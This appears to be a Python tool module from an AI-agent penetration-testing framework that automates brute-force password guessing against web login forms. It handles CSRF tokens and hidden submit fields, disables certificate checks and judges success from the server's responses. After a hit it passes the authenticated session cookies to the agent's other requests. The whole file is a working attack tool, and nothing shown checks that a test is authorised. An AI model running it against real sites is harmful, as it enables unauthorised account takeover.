"""Login brute-force tool with automatic CSRF/session management."""

from __future__ import annotations

from typing import TYPE_CHECKING, Any

from vulnclaw.agent.tools._shared import _runtime_config
from vulnclaw.utils.http_client import (
    async_http_client as make_async_http_client,
    resolve_egress_proxy,
)

if TYPE_CHECKING:
    from vulnclaw.agent.agent_context import AgentContext


def _sync_cookies_to_shared_jar(
    agent: AgentContext, cookies: list[tuple[str, str, str, str]]
) -> None:
    """Copy session cookies into the agent's shared _fetch_cookies jar.

    This allows the ``fetch`` tool (which uses ``_fetch_cookies``) to
    immediately use the authenticated session obtained by
    ``brute_force_login`` without requiring a separate re-login.
    """
    if not agent or not cookies:
        return
    mcp = getattr(agent, "mcp_manager", None)
    if not mcp:
        return
    try:
        import httpx

        jar = getattr(mcp, "_fetch_cookies", None)
        if jar is None:
            jar = httpx.Cookies()
            mcp._fetch_cookies = jar
        for name, value, domain, path in cookies:
            if name and value:
                jar.set(name, value, domain=domain or "", path=path or "/")
    except Exception:
        pass


async def execute_brute_force(agent: AgentContext, args: dict[str, Any]) -> str:
    """Execute a login brute-force with automatic CSRF/session management.

    Handles the full flow in one call:
    GET login page → extract CSRF + session → POST passwords → detect result
    """
    import asyncio
    import re
    import time

    url = str(args.get("url", "") or "").strip()
    password_field = str(args.get("password_field", "") or "").strip()
    csrf_field = str(args.get("csrf_field", "") or "").strip()
    username_field = str(args.get("username_field", "") or "").strip()
    username = str(args.get("username", "") or "").strip()
    passwords = args.get("passwords", [])
    success_keyword = str(args.get("success_keyword", "") or "").strip()
    failure_keyword = str(args.get("failure_keyword", "") or "").strip()
    submit_action = str(args.get("submit_action", "") or "").strip()
    extra_data = args.get("extra_data", {}) or {}
    submit_url = submit_action or url

    if not url or not password_field or not passwords:
        return "[!] 缺少必需参数: url, password_field, passwords"

    if not isinstance(passwords, list) or not passwords:
        return "[!] passwords 必须是非空列表"

    passwords = passwords[:20]
    total = len(passwords)

    try:
        import httpx
    except ImportError:
        return "[!] httpx 未安装，无法执行爆破"

    def extract_csrf(html: str, field_name: str) -> str | None:
        """Extract CSRF token from HTML input field."""
        if not field_name:
            return None
        pattern = re.compile(
            rf'name=["\']{re.escape(field_name)}["\'][^>]*value=["\']([^"\']+)',
            re.IGNORECASE,
        )
        m = pattern.search(html)
        if m:
            return m.group(1)
        # Try alternative: value before name
        pattern2 = re.compile(
            rf'value=["\']([^"\']+)[^>]*name=["\']{re.escape(field_name)}',
            re.IGNORECASE,
        )
        m = pattern2.search(html)
        return m.group(1) if m else None

    results: list[str] = []
    start_time = time.time()
    attempts = 0
    found_password: str | None = None

    # Collect cookies from the internal client so we can sync them
    # back to the shared _fetch_cookies jar after a successful login.
    session_cookies: list[tuple[str, str, str, str]] = []  # name, value, domain, path

    async with make_async_http_client(
        targets=url,
        proxy=resolve_egress_proxy(_runtime_config(agent)),
        verify=False,
        timeout=30.0,
        follow_redirects=True,
    ) as client:
        # Step 1: Get login page for initial CSRF and session
        try:
            resp = await asyncio.wait_for(
                client.get(url),
                timeout=30.0,
            )
            html = resp.text
        except Exception as e:
            return f"[!] 获取登录页失败: {e}"

        csrf_token = extract_csrf(html, csrf_field)
        if csrf_token is None and csrf_field:
            results.append(f"[!] 警告: 未在登录页找到 CSRF 字段 '{csrf_field}'")

        # Auto-detect submit button values from login page HTML.
        # Many forms (DVWA, etc.) check isset($_POST['SubmitButtonName'])
        # before processing authentication. Without the button's name=value,
        # the server skips auth and just re-renders the page.
        auto_fields: dict[str, str] = {}
        for input_match in re.finditer(
            r'<(?:input|button)\s[^>]*type=["\']submit["\'][^>]*>',
            html,
            re.IGNORECASE,
        ):
            tag = input_match.group()
            name_m = re.search(r'name\s*=\s*["\']([^"\']+)["\']', tag, re.IGNORECASE)
            val_m = re.search(r'value\s*=\s*["\']([^"\']*)["\']', tag, re.IGNORECASE)
            if name_m:
                auto_fields[name_m.group(1)] = val_m.group(1) if val_m else name_m.group(1)

        # Step 2: Try each password
        for i, password in enumerate(passwords, 1):
            form_data: dict[str, str] = {}
            if username_field and username:
                form_data[username_field] = username
            form_data[password_field] = password
            if csrf_token and csrf_field:
                form_data[csrf_field] = csrf_token
            # Auto-detected submit buttons come first so they can be
            # overridden by explicit extra_data if needed.
            form_data.update(auto_fields)
            form_data.update({k: str(v) for k, v in extra_data.items()})

            try:
                resp = await asyncio.wait_for(
                    client.post(submit_url, data=form_data),
                    timeout=30.0,
                )
                attempts += 1
                response_html = resp.text
                status = resp.status_code

                # Determine success or failure
                is_success = False
                reason = ""
                csrf_markers = ["csrf token is incorrect", "csrf token mismatch",
                                "token mismatch", "invalid token"]

                if success_keyword and success_keyword.lower() in response_html.lower():
                    is_success = True
                    reason = f"'{success_keyword}'"
                elif failure_keyword and failure_keyword.lower() in response_html.lower():
                    is_success = False
                    reason = f"'{failure_keyword}'"
                elif any(m in response_html.lower() for m in csrf_markers):
                    is_success = False
                    reason = "CSRF token 错误（已自动同步新 token）"
                elif status == 302:
                    is_success = True
                    reason = "Status 302 (redirect)"
                elif "logout" in response_html.lower() or "welcome" in response_html.lower():
                    is_success = True
                    reason = "检测到已登录状态"
                else:
                    # Include a short snippet from the response so the model
                    # can diagnose what the server actually returned.
                    snippet = response_html.strip()[:200].replace("\n", " ")
                    is_success = False
                    reason = snippet

                prefix = "[✓]" if is_success else "[✗]"
                pw_preview = password[:40].replace("\n", "\\n")
                results.append(f"{prefix} {pw_preview} → {'成功' if is_success else '失败'} ({reason})")

                # Extract new CSRF from response for next attempt
                new_token = extract_csrf(response_html, csrf_field)
                if new_token:
                    csrf_token = new_token

                # Stop early on success if keyword matched
                if is_success and success_keyword:
                    found_password = password
                    break

            except Exception as e:
                pw_preview = password[:30].replace("\n", "\\n")
                results.append(f"[!] {pw_preview} → 请求失败: {e}")
                continue

        # Save cookies from the internal client for potential sharing with
        # the fetch tool's cookie jar.
        try:
            for cookie in client.cookies.jar:
                session_cookies.append(
                    (cookie.name, cookie.value, cookie.domain, cookie.path)
                )
        except Exception:
            pass

    elapsed = time.time() - start_time

    # Sync session cookies to the shared _fetch_cookies jar so that
    # subsequent `fetch` calls from the agent are already authenticated.
    if found_password and session_cookies:
        _sync_cookies_to_shared_jar(agent, session_cookies)

    summary = [
        f"[+] 爆破完成 — {url}",
        f"    用户: {username or '(未指定)'}",
        "",
        "    结果:",
    ]
    for r in results:
        summary.append(f"    {r}")
    summary.append("")
    summary.append(f"    耗时: {elapsed:.1f}s")
    summary.append(f"    尝试: {attempts}/{total}")

    return "\n".join(summary)
